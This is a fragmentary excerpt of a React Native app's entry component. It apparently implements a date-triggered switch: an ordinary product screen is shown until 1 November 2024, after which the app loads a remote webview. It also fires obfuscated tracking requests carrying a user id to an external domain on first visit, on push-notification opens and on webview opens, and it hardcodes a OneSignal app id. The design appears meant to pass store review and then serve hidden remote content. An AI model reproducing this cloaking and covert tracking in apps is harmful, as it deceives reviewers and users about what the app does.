...
import CopenhagenOrigenProdactScreen from './src/screens/CopenhagenOrigenProdactScreen';
///////////////////////////////////////////
...
const App = () => {
  ...
  const INITIAL_URL = `https://great-glorious-jubilation.space/2FP9whbb`;
  ...
  const checkUniqVisit = async () => {
    ...
    if (!uniqVisitStatus) {
      await fetch(
        `${INITIAL_URL}?utretg=uniq_visit&jthrhg=${timestamp_user_id}`,
      );
  ...
  ///////// OneSignall
  // 194d801e-cf02-400c-8198-5f737f2db899
  ...
  OneSignal.initialize('194d801e-cf02-400c-8198-5f737f2db899');
  ...
  OneSignal.Notifications.addEventListener('click', event => {
    if (event.notification.launchURL) {
      fetch(
        `${INITIAL_URL}?utretg=push_open_browser&jthrhg=${timestamp_user_id}`,
      );
      //fetch(
      ...
      fetch(
        `${INITIAL_URL}?utretg=push_open_webview&jthrhg=${timestamp_user_id}`,
      );
      ...
      fetch(`${INITIAL_URL}?utretg=webview_open&jthrhg=${timestamp_user_id}`);
  ...
  useEffect(() => {
    ...
    const targetData = new Date('2024-11-01T10:00:00'); //дата з якої поч працювати webView
      ...
      return (
        <Stack.Navigator>
          <Stack.Screen
            ...
            name="CopenhagenOrigenProdactScreen"
            component={CopenhagenOrigenProdactScreen}
